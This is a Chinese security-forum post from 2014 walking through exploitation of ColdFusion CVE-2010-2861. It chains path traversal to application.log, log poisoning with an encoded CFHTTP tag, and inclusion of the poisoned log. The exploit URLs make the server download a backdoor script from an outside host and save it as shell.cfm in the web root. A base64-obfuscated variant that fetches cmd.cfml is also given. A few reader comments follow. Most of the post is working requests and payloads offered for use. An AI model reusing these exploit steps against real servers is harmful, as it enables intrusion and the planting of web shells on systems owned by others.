<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">COLDFUSION(CVE-2010-2861) 本地包含利用方法</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">mickey</a> <span class="bull">·</span> <time title="2014/04/19 13:55" ui-time="" datetime="2014/04/19 13:55" class="published ng-binding ng-isolate-scope">2014/04/19 13:55</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>最近看老外的一篇文章说，CVE-2010-2861这个利用方法，只有看到过通过读取password.properties里的password字段，破解SHA-1值登陆后台，或者通过传递哈希登陆后台的，还没见过能直接得到SHELL的。其实我以前和小伙伴讨论过利用application.log本地包含CFM的方法，当时的利用方法是这样的：</p><p>首先看看application.log有没有在默认的目录：</p><pre><code>http://10.18.180.23:8500//CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\logs\application.log%00en
</code></pre><p>然后访问一个不存在的页面，注意编码问题，否则不成功的。</p><pre><code>http://192.168.72.141:8500/%3CCFHTTP%20METHOD%3DGet%20URL%3D%23URL.u%23%20PATH%3D%23URL.p%23%20FILE%3D%23URL.f%23%3E.cfml
</code></pre><p>这时候就会把<code>&lt;CFHTTP METHOD=Get URL=#URL.u# PATH=#URL.p# FILE=#URL.f#&gt;</code>注入到application.log里了，看下图：</p><p><img alt="2014041409324320691.jpg" img-src="eff65e28fe7ece0d6c4342027600c70ccd2249fa.jpg"></p><p>最后我们访问</p><pre><code>http://10.18.180.23:8500//CFIDE/administrator/enter.cfm?locale=................\ColdFusion8\logs\application.log%00en&amp;u=http://10.18.180.20/dvwa/hackable/uploads/xl.txt&amp;p=C:\ColdFusion8\wwwroot&amp;f=shell.cfm
</code></pre><p><img alt="2014041409332372208.jpg" img-src="f4af4c06605f3bbf92615d549d1a384daad2004e.jpg"></p><p>就会从10.18.180.20上把xl.txt的CF后门脚本下载到目标机器的<code>c:\ColdFusion8\wwwroot</code>目录了。</p><p>我们看看老外用的方法：思路都是一样的，就是他的payload选择的是</p><pre><code>&lt;cfhttp method='get' url='#ToString(ToBinary('aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s'))#' path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#' file='cmd.cfml'&gt;
</code></pre><p>使用cfm的CFHTTP标签执行一个HTTP请求来取得192.168.1.97:8000 WEB服务器上的cmd.cfml文件，ToString(ToBinary是为了做BASE64编码，绕过一些字符的限制，比如/</p><p>下面说说此法的缺点：</p><pre><code>1.不是通杀的方法，如果对方禁止对外的HTTP访问，此法不行 
2.如果安装的时候是集成到IIS模式的，CF程序目录放到其他盘符的话，是没法使用../跨目录的 
</code></pre><p></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">L.N.</span> <span class="reply-time">2014-04-30 10:30:17</span></div><p></p><p>围观Mickey牛</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Master</span> <span class="reply-time">2014-04-22 17:46:13</span></div><p></p><p>围观Mickey牛。。Mark，。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">HackBraid</span> <span class="reply-time">2014-04-20 16:50:06</span></div><p></p><p>mickey牛！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">疯子</span> <span class="reply-time">2014-04-19 21:57:59</span></div><p></p><p>那你就找后台！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DM_</span> <span class="reply-time">2014-04-19 14:33:13</span></div><p></p><p>如果不是默认后台....</p><p></p></div></div></div></div></div></main>